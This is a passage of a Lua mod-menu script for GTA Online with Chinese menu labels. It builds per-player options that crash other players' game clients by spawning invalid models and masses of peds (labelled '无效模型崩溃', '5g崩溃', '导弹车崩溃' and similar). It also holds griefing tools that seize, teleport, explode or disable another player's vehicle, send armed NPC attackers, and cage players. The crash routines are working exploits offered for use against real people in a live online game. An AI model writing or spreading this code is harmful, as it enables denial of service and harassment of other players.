			invalidpeda2 = CreatePed(26, util.joaat("ig_kaylee"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 50 do 
			invalidpeda3 = CreatePed(26, util.joaat("a_c_rat"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(5000)
		util.yield(300)
		notification("崩溃完成，等待删除PED",colors.pink)
		util.yield(300)
		local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
		notification("滚吧",colors.pink)
		util.yield(300)
	end)

	menu.action(invalidmodel, "无效模型崩溃V4", {}, "", function()
    STREAMING.REQUEST_MODEL(1888301071)
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local cone = OBJECT.CREATE_OBJECT_NO_OFFSET(1888301071, c.x +3, c.y, c.z, true)
	if players.exists(PlayerID) then
		STREAMING.REQUEST_MODEL(0xB5CF80E4)
		while not STREAMING.HAS_MODEL_LOADED(a_c_rat) do
    		util.yield(0)
		end
		for i = 1, 12 do
			util.create_thread(function()
				local ped_1 = entities.create_ped(0, 0xB5CF80E4, ENTITY.GET_ENTITY_COORDS(PlayerID), ENTITY.GET_ENTITY_HEADING(players.user_ped(PlayerID)), true, false)
				util.yield(400)
				entities.delete_by_handle(ped_1)
			end, nil)
		end
		util.yield(100)
		local ped_2 = entities.create_ped(0, 0x3F039CBA, ENTITY.GET_ENTITY_COORDS(PlayerID), ENTITY.GET_ENTITY_HEADING(players.user_ped(PlayerID)), true, false)
		local ped_3 = entities.create_ped(0, 0x856CFB02, ENTITY.GET_ENTITY_COORDS(PlayerID), ENTITY.GET_ENTITY_HEADING(players.user_ped(PlayerID)), true, false)
		local ped_4 = entities.create_ped(0, 0x2D7030F3, ENTITY.GET_ENTITY_COORDS(PlayerID), ENTITY.GET_ENTITY_HEADING(players.user_ped(PlayerID)), true, false)
		util.yield(800)
		entities.delete_by_handle(ped_2)
		entities.delete_by_handle(ped_3)
		entities.delete_by_handle(ped_4)
		if players.exists(PlayerID) then
		end
		util.toast("无效NPC崩溃完成",5,61000)
	else
		util.toast("未知玩家坐标",5,0)
	end
end)
        
        menu.action(PlayerMainMenu, "5g崩溃", {"5gcrash"}, "5gcrash", function()
            x999gcrash(PlayerID)
        end)

        menu.toggle_loop(PlayerMainMenu, "6g崩溃", {"six6crash"}, "6gcrash", function()
            six6crash(PlayerID)
        end)
        
        menu.action(PlayerMainMenu, "大JB崩", {"dick"}, "dick", function()
            suckmydick(PlayerID)
        end)
        local Chernobog = menu.list(PlayerMainMenu, "导弹车崩溃", {}, "")
        menu.click_slider(Chernobog,"导弹车崩溃", {"Chernobog Crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
            if on_change == 1 then	
                daodanchev1(PlayerID) 
            end
            if on_change == 2 then	
                daodanchev2(PlayerID)
            end
    end)

        menu.action(PlayerMainMenu, "猎杀者", {"huntercrash"}, "有bug，慎用", function()
            huntercrash(PlayerID)
        end)
    
        menu.action(PlayerMainMenu, "无效外观V1", {"invalidclothesv1"}, "", function()
            BadOutfitCrashV1(PlayerID)
        end)

        menu.toggle_loop(PlayerMainMenu, "单崩黄昏", {"dh"}, "", function()
            dhcrash(PlayerID)
            end)
    
        menu.toggle_loop(PlayerMainMenu, "拖车崩", {"tuoche"}, "tuoche", function()
            tuocheb(PlayerID)
        end)

            menu.action(PlayerMainMenu,"TP", {""}, "传送到玩家", function()
            tpplayer(PlayerID)
        end)	   
    
    end	
    players.on_join(GenerateFeatures)

    local function playerActionsSetup(pid) 

    local playerMain = menu.list(menu.player_root(pid), "恶搞选项", {""}, "")

    local playerOtherTrolling = menu.list(playerMain, "载具恶搞", {}, "")

    local player_veh_teleport = menu.list(playerOtherTrolling, "传送载具", {}, "")

    menu.action(player_veh_teleport, "传送载具到我", {"tpvtome"}, "如果这不起作用，它不是一个bug", function(on_click)
        tpcartome(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到导航点", {"tpvtoway"}, "如果这不起作用，它不是一个bug", function(on_click)
        tocartopoint(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到花园银行停机坪", {"tpvtomaze"}, "如果这不起作用，它不是一个bug", function(on_click)
        tptomaze(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到深海底", {"tpvunderwater"}, "如果这不起作用，它不是一个bug", function(on_click)
        tptounderwater(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到高空", {""}, "", function()
        tptohighair(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到洛圣都改车王", {"tpvlsc"}, "如果这不起作用，它不是一个bug", function(on_click)
        tolsc(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到监狱SCP-173单元", {"tpvscp"}, "如果这不起作用，它不是一个bug", function(on_click)
        tpscp(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到大牢房中", {"tpvcell"}, "如果这不起作用，它不是一个bug", function(on_click)
        tocell(pid)
    end)

    local trolly_Vehicles = menu.list(playerOtherTrolling, "恶搞载具", {}, "")

	menu.action_slider(trolly_Vehicles, "发送恶搞载具", {}, "", {"Bandito", "Go-Kart"}, function (index, opt)
		send_veh_attack(opt, index, pid)
	end)

	menu.toggle(trolly_Vehicles, "无敌的", {}, "",function(toggle) 
        send_veh_attack_god(toggle)
    end)

	menu.action(trolly_Vehicles, "派武装匪徒", {}, "", function()
        send_veh_attacker(pid)
	end)

	menu.slider_text(trolly_Vehicles, "匪徒武器", {}, "", {util.get_label_text("BAND_BOMB"), util.get_label_text("TOP_MINE")}, function (index, value)
        send_veh_attacker_weapon(index, value)
	end)

	mineSlider = menu.slider_text(trolly_Vehicles, "地雷", {}, "", {util.get_label_text("KINET_MINE"), util.get_label_text("EMP_MINE")}, function (index, value)
		send_veh_attacker_weapon_mine(index, value)
	end)

	menu.slider(trolly_Vehicles, "数量", {}, "", 1, 10, 1, 1, function(value)
        send_veh_attacker_number(value)
    end)

	menu.action(trolly_Vehicles, "删除", {}, "", function()
        dele_all_veh_attacker()
	end)

	menu.set_visible(mineSlider, false)

    local enemyVehiclesOpt = menu.list(playerOtherTrolling, "敌对载具", {}, "")

	menu.action_slider(enemyVehiclesOpt, "派遣敌对载具", {}, "", {"Minitank", "Buzzard", "Lazer"}, function(index, option)
        veh_attacker_spawn(pid, index, option)
	end)

	menu.slider_text(enemyVehiclesOpt, "迷你坦克武器", {}, "", {util.get_label_text("WT_V_PLRBUL"),util.get_label_text("MINITANK_WEAP2"),util.get_label_text("MINITANK_WEAP3"),}, function(index)
        mintank_weapon(index)
	end)

	menu.slider_text(enemyVehiclesOpt, "枪手的武器", {}, "", {util.get_label_text("WT_MG"), util.get_label_text("WT_RPG")}, function(index)
		gunner_weapon(index)
	end)

	menu.slider(enemyVehiclesOpt, "数量", {}, "",1, 10, 1, 1, function (value)
        veh_attacker_spawn_count(value)
    end)

	menu.toggle(enemyVehiclesOpt, "无敌", {}, "",function(toggle)
        veh_attacker_spawn_god(toggle) 
    end)

	menu.action(enemyVehiclesOpt, "删除", {}, "", function()
        dele_veh_attacker()
	end)

    local cplaym = menu.list(playerOtherTrolling, '载具攻击', {}, '')

    local vehaloop =  menu.toggle_loop(cplaym, '载具攻击', {'SmashPla'},'使玩家无法站起来', function ()
        vehpushandhit(pid)
     end)
 
     menu.set_value(vehaloop, nil)
 
     menu.toggle(cplaym, '隐形载具', {}, '将攻击载具更改为不可见', function (on)
        vehhitcantsee(on)
     end)

     local cclist = menu.list(cplaym, '更改为用于载具攻击的载具', {}, '')
     menu.list_action(cclist, '载具列表', {''}, '更改为用于载具攻击的载具', Vehlist, function(vehsel)
        vehaset.vehasel = util.joaat(Vehha[vehsel])
     end)
 
     menu.slider(cplaym, '攻击频率', {'assaultrate'}, '调整载具攻击频率', 100, 4000, 1000, 100, function (ar)
         vehaset.vehra = ar
      end)

     menu.text_input(cclist, '输入自定义载具模型名', {'cussmash'}, '输入车辆模型名以更改载具为攻击载具', function(cussma)
        if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cussma)) then
            vehaset.vehasel = util.joaat(cussma)
         else
            if set.alert then
                util.toast('载具名称不正确(请检查你的拼写)')
            end
         end
 end, 'toreador')

     local radio = menu.list(playerOtherTrolling, "更换广播电台", {}, "")
    local stations = {}
    for station, name in pairs(station_name) do
        stations[#stations + 1] = station
    end
    menu.list_action(radio, "广播电台", {}, "", stations, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(players.user())
        local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)

        if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then
            util.toast("玩家不在载具中. :/")
        return end
        local radio_name = station_name[value]
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then 

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("未能成功更换玩家电台. :/")
            return end

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
            if not PED.IS_PED_IN_VEHICLE(players.user_ped(), player_veh, false) then
                ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false)
                menu.trigger_commands("tpveh" .. players.get_name(pid))
                util.yield(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
                util.yield(750)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos, false, false, false)
            else
                util.yield(250)
                AUDIO.SET_VEH_RADIO_STATION(player_veh, radio_name)
            end
        end
    end)

        control_veh = player_toggle_loop(playerOtherTrolling, pid, "控制玩家载具", {}, "必须在陆地上的载具才能使用该功能.", function(toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
        if not players.exists(pid) then util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("离得太远了. :/")
            menu.set_value(control_veh, false)
        return end

        if class == 15 then
            util.toast("玩家在直升机上 :/")
            menu.set_value(control_veh, false)
        return end
        
        if class == 16 then
            util.toast("玩家在飞机上. :/")
            menu.set_value(control_veh, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                while not PAD.IS_CONTROL_RELEASED(0, 34) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                while not PAD.IS_CONTROL_RELEASED(0, 35) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                while not PAD.IS_CONTROL_RELEASED(0, 32) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                while not PAD.IS_CONTROL_RELEASED(0, 33) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                    util.yield()
                end
            end
        else
            util.toast("玩家不在载具中. :/")
            menu.set_value(control_veh, false)
        end
        util.yield()
        
    end)

 menu.list_action(playerOtherTrolling, "附加", {}, "", {"到他的车", "他的车到我的车", "我的车到他的车", "分离"}, function(index, value, click_type)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        pluto_switch index do
            case 1: 
                ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                break 
            case 2: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(car, player_cur_car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break
            case 3: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(player_cur_car, car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break

            case 4: 
                ENTITY.DETACH_ENTITY(car, false, false)
                if player_cur_car ~= 0 then
                    ENTITY.DETACH_ENTITY(player_cur_car, false, false)
                end
                ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
                break
        end
    end
end)

    menu.action_slider(playerOtherTrolling, "神风敢死队", {}, "", {"Lazer", "Mammatus",  "Cuban800"}, function (index, plane)
        planedied(pid, index, plane)
    end)

    menu.toggle_loop(playerOtherTrolling, "敌对交通--周围的车撞他", {}, "", function()
        nearcarkill(pid)
    end)

function control_vehicle(pid, callback, opts)
    local vehicle = get_player_vehicle_in_control(pid, opts)
    if vehicle > 0 then
        callback(vehicle)
    elseif opts == nil or opts.silent ~= true then
    end
end

        menu.click_slider(playerOtherTrolling,"弹飞载具", {}, "", -200, 200, 200, 10, function(mph)
            local speed = mph / 0.44704
            control_vehicle(pid, function(vehicle)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, speed)
                local vel = ENTITY.GET_ENTITY_VELOCITY(vehicle)
                ENTITY.SET_ENTITY_VELOCITY(vehicle, vel.x, vel.y, vel.z + 2.0)
                VEHICLE.RESET_VEHICLE_WHEELS(vehicle)
            end)
        end)

        menu.action(playerOtherTrolling,"载具上升", {}, "", function()
            control_vehicle(pid, function(vehicle)
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, 100.0)
                local vel = ENTITY.GET_ENTITY_VELOCITY(vehicle)
                ENTITY.SET_ENTITY_VELOCITY(vehicle, vel.x, vel.y, vel.z + 100.0)
                VEHICLE.RESET_VEHICLE_WHEELS(vehicle)
            end)
        end)

        menu.action(playerOtherTrolling,"载具降落", {}, "", function()
            control_vehicle(pid, function(vehicle)
                VEHICLE._STOP_BRING_VEHICLE_TO_HALT(vehicle)
                ENTITY.SET_ENTITY_VELOCITY(vehicle, 0.0, 0.0, 0.0)
            end)
        end)

        menu.action(playerOtherTrolling,"锁车门", {}, "", function()
            control_vehicle(pid, function(vehicle)
            VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i - 1, false, false)
            end)
        end)

    menu.action(playerOtherTrolling,"锁胎", {}, "", function()
        control_vehicle(pid, function(vehicle)
            if open_doors then
                for door = 0,7 do
                    VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, door, false, false)
                end
            else
                VEHICLE.SET_VEHICLE_DOORS_SHUT(vehicle, false)
            end
        end)
    end)

    menu.action(playerOtherTrolling,"爆炸车", {}, "", function()
        control_vehicle(pid, function(vehicle)
            local pos = ENTITY.GET_ENTITY_COORDS(vehicle, 1)
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + 1.0, 26, 60, true, true, 0.0)
        end)
    end)

    menu.toggle_loop(playerOtherTrolling, "伪造玩家的载具", {"vehfakelag"}, "将玩家的载具传送到他们身后一点,模拟延迟.", function ()
        FakeLagPlayerVehicle(pid)
    end)

    menu.list_action(playerOtherTrolling, "车门", {}, "", {"打开", "关闭", "打破"}, function(index, value, click_type)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local d = VEHICLE.GET_NUMBER_OF_VEHICLE_DOORS(car)
            for i=0, d do
                pluto_switch index do
                    case 1: 
                        VEHICLE.SET_VEHICLE_DOOR_OPEN(car, i, false, true)
                        break
                    case 2:
                        VEHICLE.SET_VEHICLE_DOOR_SHUT(car, i, true)
                        break
                    case 3:
                        VEHICLE.SET_VEHICLE_DOOR_BROKEN(car, i, false)
                        break
                end
            end
        end
    end)

    local winmenu = menu.list(playerOtherTrolling, '车窗控制', {}, '如果你靠近他们，效果会更好/更快')

    menu.action(winmenu, '卷起所有窗口', {'rolluwin'}, '立即卷起所有窗口', function ()
        GetPlayVeh(pid, function ()
            Rollaup(pid)
        end)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(winmenu, '滚下所有窗户', {'rolldwin'}, '立即卷起所有窗口', function ()
        GetPlayVeh(pid, function ()
            Rolladown(pid)
        end)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.list_action(winmenu, '收起单个窗口', {''}, '收起单个窗口', Windows,
    function(index)
        local win = index - 1
        GetPlayVeh(pid, function ()
            Rolluindivid(pid, win)
        end)
    end)

    menu.list_action(winmenu, '打开单个窗口', {''}, '打开单个窗口', Windows,
    function(index)
        local win = index - 1
        GetPlayVeh(pid, function ()
            Rolldindivid(pid, win)
        end)
    end)

    menu.action(playerOtherTrolling, "载具无敌", {}, "", function(click_type)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
            VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(car, false)
        end
    end)

    menu.click_slider(playerOtherTrolling, "载具最高速度", {}, "", -10000, 10000, 200, 100, function(s)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(car, s)
            ENTITY.SET_ENTITY_MAX_SPEED(car, s)
        end
    end)

    menu.toggle(playerOtherTrolling, "隐形载具", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            if on then
                ENTITY.SET_ENTITY_ALPHA(car, 255)
                ENTITY.SET_ENTITY_VISIBLE(car, false, 0)
            else
                ENTITY.SET_ENTITY_ALPHA(car, 0)
                ENTITY.SET_ENTITY_VISIBLE(car, true, 0)
            end
        end
    end)

    menu.action(playerOtherTrolling, "压死他", {"squish"}, "压死它们，直到它们死去。适用于大多数菜单。(注意：如果目标正在使用无布娃娃，则不会起作用).", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local khanjali = util.joaat("khanjali")
        request_model(khanjali)

        if TASK.IS_PED_STILL(ped) then
            distance = 0.0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 2.0
        end

        local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, distance, 2.8), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle3 = entities.create_vehicle(khanjali, pos, 0)
        local vehicle4 = entities.create_vehicle(khanjali, pos, 0)
        local spawned_vehs = {vehicle1, vehicle2, vehicle3, vehicle4}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0.0, 0.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0.0, 3.0, 3.0, 0.0, 0.0, 0.0, -180.0, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0.0, 3.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end) 

    menu.toggle(playerOtherTrolling, "手刹", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_HANDBRAKE(car, on)
        end
    end)

    menu.toggle_loop(playerOtherTrolling, "随机制动", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_HANDBRAKE(car, true)
            util.yield(1000)
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_HANDBRAKE(car, false)
            util.yield(math.random(3000, 15000))
        end
    end)

    menu.toggle(playerOtherTrolling, "冻结", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            speed = if on then 0.0 else 1000.0
            ENTITY.SET_ENTITY_MAX_SPEED(car, speed)
        end
    end)

    menu.action(playerOtherTrolling, "爆胎", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            for i=0, 7 do
                VEHICLE.SET_VEHICLE_TYRE_BURST(car, i, true, 1000.0)
            end
        end
    end)

    menu.action(playerOtherTrolling, "将载具调头", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y'], rot['z']+180, 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)

    menu.action(playerOtherTrolling, "翻转车辆", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y']+180, rot['z'], 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)

    menu.action(playerOtherTrolling, "关掉引擎", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_ENGINE_ON(car, false, true, false)
        end
    end)

    menu.action(playerOtherTrolling, "删除载具", {}, "删除此玩家正在驾驶的载具", function()
        deleplayercar(pid)
    end)

    menu.action(playerOtherTrolling, "踢出载具", {}, "", function(toggled)
        kickcar(pid)
    end)

	menu.action(playerOtherTrolling, "变成小恐龙", {""}, "", function(on_click)
        changemodel(pid)
    end)
	
	menu.action(playerOtherTrolling, "传送载具到我", {""}, "", function(on_click)
        tpcartomv2(ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
    end)

    menu.action(playerOtherTrolling, "将墙放在玩家面前", {}, "在玩家面前放置墙壁,半秒后删除", function ()
        qfmq(pid)
    end)

    menu.slider_text(playerOtherTrolling, "劫持车辆", {"hijack"}, "随机 NPC 劫持他们的车辆", jclll, function(hijackLevel)
        gethimcar(pid)
    end)

    menu.toggle(playerOtherTrolling, "随机升级", {"upgradevehicle"}, "", function(state)
        abcd = state
    while abcd do
        randomupdatcar(pid)
    util.yield(500)
        end
    end)

    menu.toggle_loop(playerOtherTrolling, "让他以为自己能走", {""}, "假象", function ()
        letcarlagging(pid)
    end)

    glitchVehCmd = menu.toggle(playerOtherTrolling, "鬼畜载具", {"glitchvehicle"}, "", function(toggle)
        glitchcar(toggle, pid)
    end)

    menu.toggle_loop(playerOtherTrolling, "快乐的小陀螺", {"beybladev"}, "", function(on)
        carspin(pid)
    end)

    menu.action(playerOtherTrolling, "电磁脉冲炸弹", {"empvehicle"}, "", function(on)
        caremp(pid)
    end)

    local npctrolls_root = menu.list(playerMain, "NPC恶搞", {"npctrolls"}, "")

	local attacker_trolling = menu.list(npctrolls_root, "攻击者选项", {}, "")

	ModelList.new(attacker_trolling, "生成攻击者", "", "", attackerList, function (caption, model)
        spawn_attacker(pid, caption, model)
	end, false, false)


	menu.action(attacker_trolling, "克隆玩家（敌人)", {}, "", function()
        spawn_attacker_own(pid)
	end)

	weaponList = WeaponList.new(attacker_trolling, "设置武器", "", "", nil, true)

	menu.action(attacker_trolling, "派遣敌人", {}, "", function()
        spawn_attacker_click(pid)
	end)

	menu.slider(attacker_trolling, "数量", {}, "",1, 10, 1, 1, function(value)
        spawn_attacker_count(value)
    end)

	menu.action(attacker_trolling, "派遣警车", {}, "", function()
        spawn_police_car(pid)
	end)

	menu.toggle(attacker_trolling, "无敌攻击者", {}, "",function(toggle)
        send_attacker_god(toggle)
    end)

	menu.toggle(attacker_trolling, "固定的", {}, "",function(toggle)
        send_attacker_stay(toggle) 
    end)

	menu.action(attacker_trolling, "删除攻击者", {}, "", function()
        attacker_dele()
	end)

    menu.list_action(npctrolls_root, "拖车", {"towcar"}, "他们没有付房租。", tow_options, function(index, value, click_type)
        towcarpro(pid, index, value)
    end)

    menu.action(npctrolls_root, "喵喵炸弹", {"meow"}, "UWU", function(on_click)
        meowbmob(pid)
    end)

    menu.action(npctrolls_root, "召唤马里亚奇乐队", {"mariachiband"}, "", function(click_type)
        dispatch_mariachi(pid)
    end)

    menu.action(npctrolls_root, "NPC偷最后一辆车v3.0", {"npcjack"}, "派一个NPC去偷他们的车", function(on_click)
        npc_jack(pid, false)
    end)

    menu.list_action(npctrolls_root, "派一个自定义的妓女来", {"customhooker"}, "发送一个可实际使用的自定义妓女。这只适用于联机。", custom_hooker_options, function(index, value, click_type)
        sendsexgirl(pid, index, value)
    end)

    menu.list_action(npctrolls_root, "绑架", {"kidnap"}, "", kidnap_types, function(index, value)
        kidnapplayer(pid, index,value)
    end)

    menu.action(npctrolls_root, "告诉附近的警察逮捕他们", {"arrest"}, "告诉附近的警察逮捕那个玩家。很明显，GTA在线模式中没有逮捕功能。所以他们实际上没有逮捕。但他们会努力的。", function(on_click)
        tellpolicetocatch(pid)
    end)

    menu.list_action(npctrolls_root, "在车里装满行人", {"fillcar"}, "用附近的行人填充玩家的车", fill_with_options, function(index, value, click_type)
        npcfillthecar(pid, index,value)
    end)


	menu.action(npctrolls_root, "苦力怕小丑(MC里的爬行者)", {"creeper"}, "产生一个小丑，让他跑向玩家并在附近爆炸", function()
		creep(pid)
	end, nil, nil, COMMANDPERM_RUDE)

	menu.action(npctrolls_root, "派遣劫匪", {}, "", function()
        sendmugger_npc(pid)
	end)

	menu.action(npctrolls_root, "派遣雇佣兵", {}, "", function()
        sendkiller(pid)
	end)


lz = menu.list(playerMain, "笼子恶搞", {""}, "") 


local set = {alert = true}
cage_table = {}
local pedset = {mdl = 'u_m_m_jesus_01'}
local pedca =  menu.toggle_loop(lz, 'Ped笼子', {'PCAGE'}, '将玩家困在Ped笼子里', function ()
local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
local pname = PLAYER.GET_PLAYER_NAME(pid)
if not cage_table[pid] then
    local peds = {}
    local pedhash = util.joaat(pedset.mdl)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method"))
    Delcar(targets, spec, pid)

    local ped_tab = {'p1', 'p2', 'p3', 'p4', 'p5', 'p6', 'p7', 'p8'}
    for _, spawned_ped in ipairs(ped_tab) do
        spawned_ped = Pedspawn(pedhash, tar1)
        table.insert(peds,  spawned_ped)
    end

SetPedCoor(peds[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(peds[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(peds[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(peds[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(peds[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

---------Audio--------------
if pedhash == util.joaat('IG_LesterCrest')  then
    Teabagtime(peds[1], peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8])
elseif pedhash == util.joaat('player_two') then
    Trevortime(peds)
elseif pedhash == util.joaat('u_m_m_jesus_01') then
    Jesuslovesyou(peds)  
elseif pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
